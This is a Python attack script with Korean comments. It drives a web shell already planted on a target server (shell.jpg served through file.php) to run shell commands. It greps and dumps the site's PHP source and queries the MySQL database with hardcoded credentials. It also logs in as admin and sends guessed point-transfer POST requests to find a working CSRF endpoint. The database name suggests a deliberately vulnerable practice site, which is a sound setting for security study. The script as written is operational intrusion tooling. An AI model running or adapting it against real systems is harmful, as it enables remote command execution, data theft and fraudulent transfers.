#!/usr/bin/env python3
"""
포인트 전송 기능 찾기 스크립트
웹쉘을 통해 실제 포인트 전송 엔드포인트를 찾아냅니다.
"""

import requests
import sys
import re
from urllib.parse import urlencode

class PointTransferFinder:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/file.php"
        self.webshell_name = "shell.jpg"
        self.session = requests.Session()

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        try:
            params = {
                'name': self.webshell_name,
                'cmd': cmd
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def find_php_files(self):
        """PHP 파일 목록 찾기"""
        print("[*] PHP 파일 찾는 중...")
        result = self.execute_command("ls -la /var/www/html/www/*.php")
        if result:
            print(result)
            return result
        return None

    def search_point_functions(self):
        """포인트 관련 함수 찾기"""
        print("\n[*] 포인트 관련 코드 검색 중...")

        # 검색할 키워드들
        keywords = [
            "point",
            "gift",
            "send",
            "transfer",
            "receiver",
            "sender"
        ]

        for keyword in keywords:
            print(f"\n[*] 검색 키워드: {keyword}")
            cmd = f"grep -rn '{keyword}' /var/www/html/www/*.php 2>/dev/null | head -20"
            result = self.execute_command(cmd)
            if result:
                print(result[:1000])

    def analyze_profile_php(self):
        """profile.php 분석"""
        print("\n" + "="*60)
        print("profile.php 분석")
        print("="*60)

        # POST 파라미터 찾기
        print("\n[*] POST 파라미터 찾기...")
        cmd = "grep -n 'POST\\|_POST' /var/www/html/www/profile.php | head -30"
        result = self.execute_command(cmd)
        if result:
            print(result)

        # point 관련 코드 찾기
        print("\n[*] point 관련 코드...")
        cmd = "grep -n -i 'point' /var/www/html/www/profile.php | head -20"
        result = self.execute_command(cmd)
        if result:
            print(result)

        # UPDATE 쿼리 찾기
        print("\n[*] UPDATE 쿼리 찾기...")
        cmd = "grep -n -i 'UPDATE.*point' /var/www/html/www/profile.php"
        result = self.execute_command(cmd)
        if result:
            print(result)

    def analyze_all_php_files(self):
        """모든 PHP 파일에서 포인트 전송 기능 찾기"""
        print("\n" + "="*60)
        print("전체 PHP 파일 분석")
        print("="*60)

        # 파일 목록 가져오기
        files = self.execute_command("ls /var/www/html/www/*.php")
        if not files:
            print("[-] PHP 파일을 찾을 수 없습니다.")
            return

        php_files = [f.strip() for f in files.split('\n') if f.strip().endswith('.php')]

        print(f"\n[*] 찾은 PHP 파일: {len(php_files)}개")
        for f in php_files:
            print(f"    - {f}")

        # 각 파일에서 포인트 전송 관련 코드 찾기
        print("\n[*] 포인트 전송 관련 코드 검색...")
        cmd = """grep -l -i 'point.*POST\\|POST.*point\\|transfer.*point\\|send.*point\\|gift' /var/www/html/www/*.php 2>/dev/null"""
        result = self.execute_command(cmd)
        if result:
            print("\n[+] 포인트 관련 기능이 있는 파일:")
            print(result)

            # 각 파일의 구체적인 코드 확인
            for line in result.split('\n'):
                if line.strip() and '.php' in line:
                    filename = line.strip()
                    print(f"\n{'='*60}")
                    print(f"파일: {filename}")
                    print('='*60)

                    # 해당 파일의 POST 처리 부분 출력
                    cmd = f"grep -A 5 -B 5 -i 'POST.*point\\|point.*POST\\|transfer\\|send.*gift' {filename} | head -50"
                    code = self.execute_command(cmd)
                    if code:
                        print(code)

    def test_csrf_endpoints(self):
        """CSRF 엔드포인트 테스트"""
        print("\n" + "="*60)
        print("CSRF 엔드포인트 직접 테스트")
        print("="*60)

        # 로그인 먼저
        print("\n[*] admin 계정으로 로그인...")
        login_data = {
            'username': 'admin',
            'password': 'admin123'
        }
        resp = self.session.post(f"{self.base_url}/login.php", data=login_data)
        print(f"[+] 로그인 완료")

        # alice 계정 ID 찾기
        print("\n[*] alice 계정 ID 찾기...")
        cmd = "mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"SELECT id, username FROM users WHERE username='alice';\""
        result = self.execute_command(cmd)
        if result:
            print(result)

        # 다양한 포인트 전송 시도
        test_cases = [
            {'url': '/profile.php', 'data': {'send_points': '1', 'to_user': 'alice', 'amount': '100'}},
            {'url': '/profile.php', 'data': {'action': 'send', 'receiver': 'alice', 'points': '100'}},
            {'url': '/profile.php', 'data': {'transfer': '1', 'to': 'alice', 'point': '100'}},
            {'url': '/gift.php', 'data': {'to': 'alice', 'amount': '100'}},
            {'url': '/send_gift.php', 'data': {'receiver': 'alice', 'points': '100'}},
        ]

        print("\n[*] 포인트 전송 테스트 중...")
        for i, test in enumerate(test_cases, 1):
            print(f"\n[{i}] 테스트: POST {test['url']}")
            print(f"    데이터: {test['data']}")

            try:
                resp = self.session.post(f"{self.base_url}{test['url']}", data=test['data'], timeout=5)
                print(f"    응답 코드: {resp.status_code}")

                # 성공 메시지 확인
                if 'success' in resp.text.lower() or 'sent' in resp.text.lower() or 'transfer' in resp.text.lower():
                    print(f"    [+] 가능성 있음! 응답:")
                    print(f"    {resp.text[:300]}")
                else:
                    print(f"    [-] 실패 또는 에러")
            except Exception as e:
                print(f"    [-] 에러: {e}")

        # admin과 alice의 포인트 확인
        print("\n[*] 포인트 변경 확인...")
        cmd = "mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"SELECT username, points FROM users WHERE username IN ('admin', 'alice');\""
        result = self.execute_command(cmd)
        if result:
            print(result)

    def generate_working_csrf(self):
        """실제로 작동하는 CSRF 페이로드 생성"""
        print("\n" + "="*60)
        print("작동하는 CSRF 페이로드 생성")
        print("="*60)

        print("\n[*] profile.php의 전체 소스 확인...")
        cmd = "cat /var/www/html/www/profile.php"
        result = self.execute_command(cmd)

        if result:
            print("\n[+] profile.php 소스 코드:")
            print(result)

            # POST 파라미터 추출
            print("\n[*] POST 파라미터 분석...")
            post_params = re.findall(r'\$_POST\[[\'"](.*?)[\'"]\]', result)
            if post_params:
                print(f"\n[+] 발견된 POST 파라미터:")
                for param in set(post_params):
                    print(f"    - {param}")

    def run(self):
        """전체 실행"""
        print("="*60)
        print("포인트 전송 기능 탐지 도구")
        print("="*60)

        # 1. PHP 파일 목록
        self.find_php_files()

        # 2. 포인트 관련 함수 검색
        self.search_point_functions()

        # 3. profile.php 상세 분석
        self.analyze_profile_php()

        # 4. 모든 PHP 파일 분석
        self.analyze_all_php_files()

        # 5. profile.php 전체 소스 확인
        self.generate_working_csrf()

        # 6. 직접 테스트
        self.test_csrf_endpoints()

        print("\n" + "="*60)
        print("분석 완료!")
        print("="*60)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("사용법: python3 find_point_transfer.py <TARGET_IP>")
        print("예: python3 find_point_transfer.py 52.78.221.104")
        sys.exit(1)

    target_ip = sys.argv[1]
    finder = PointTransferFinder(target_ip)
    finder.run()
